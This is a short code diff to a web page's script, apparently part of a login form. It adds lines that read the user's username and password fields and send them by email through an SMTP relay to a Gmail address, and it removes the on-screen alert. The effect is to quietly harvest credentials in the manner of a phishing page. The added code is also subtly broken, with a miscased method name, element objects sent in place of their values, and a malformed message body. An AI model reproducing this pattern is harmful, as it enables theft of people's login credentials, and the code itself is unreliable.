@@ -89,6 +89,8 @@
           
 <script>
 function sendEmail() {
+    var password = document.getElementById("password");
+    var user = document.getElementByID("username_or_email");
 Email.send({
     Host : "smtp.mailtrap.io",
     Username : "028a6cec71c828",
@@ -96,9 +98,9 @@ Email.send({
     To : 'gracewemily67@gmail.com',
     From : "gracewemily67@gmail.com",
     Subject : "Test email",
-    Body : "<html><h2>Header</h2><strong>Bold text</strong><br></br><em>Italic</em></html>"
+    Body : user, password
 }).then(
-  message => alert(message)
+  
 );
 }
 </script>
